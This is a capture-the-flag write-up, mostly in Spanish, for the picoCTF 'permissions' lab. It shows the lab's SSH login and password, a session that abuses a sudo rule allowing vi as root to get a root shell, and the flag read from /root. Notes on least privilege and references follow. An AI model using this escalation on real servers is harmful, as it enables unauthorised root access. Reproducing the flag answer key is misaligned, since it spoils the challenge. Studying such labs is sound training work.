##  permissions
## Descripcion

Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 62540 picoplayer@saturn.picoctf.net`Password: `yX-YQgX-vS`Can you login and read the root file?
## Solucion
### solucion 1_ usando python


Acceder al servidor mediante SSH, escalar privilegios hasta obtener acceso como usuario **root**, y leer el archivo de la bandera (flag) ubicado en el directorio raíz del sistema.
 
```bash
BelovedCis-picoctf@webshell:~$ ssh -p 62540 picoplayer@saturn.picoctf.net
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.8.0-1044-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Feb 19 00:22:27 2026 from 3.140.102.47
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo vi

root@challenge:/home/picoplayer# cd /root
root@challenge:~# ls
root@challenge:~# ls -la
total 20
drwx------ 1 root root   43 Feb 19 00:26 .
drwxr-xr-x 1 root root   63 Feb 19 00:16 ..
-rw------- 1 root root   79 Feb 19 00:26 .bash_history
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  575 Feb 19 00:26 .viminfo
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_55878b51}
root@challenge:~# Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
BelovedCis-picoctf@webshell:~$ 
```

Respuesta: picoCTF{uS1ng_v1m_3dit0r_55878b51}

## Notas

### Principio de mínimo privilegio

El fallo ocurrió porque el sistema no respetaba el principio de seguridad:

Los usuarios deben tener solo los permisos estrictamente necesarios.

Permitir ejecutar `vi` como root viola este principio.

---

### Riesgo real en sistemas productivos

Este tipo de vulnerabilidad es común en:

- Servidores mal configurados
- Sistemas legacy
- Ambientes corporativos con malas prácticas de sudo

Puede permitir:

- Robo de información
- Instalación de malware
- Control total del sistema

---

### Importancia de la enumeración

La fase más importante en un pentest es:
 **Reconocimiento interno y enumeración**

Sin ejecutar exploits complejos, muchas veces basta revisar permisos.

## Referencias
### Privilege Escalation

- GTFOBins Project — Sudo Exploits  
https://gtfobins.github.io](https://gtfobins.github.io)
- Linux Privilege Escalation Guide — HackTricks  
[https://book.hacktricks.xyz](https://book.hacktricks.xyz)
- Nemeth, E. — _UNIX and Linux System Administration Handbook_
- Shotts, W. — _The Linux Command Line_
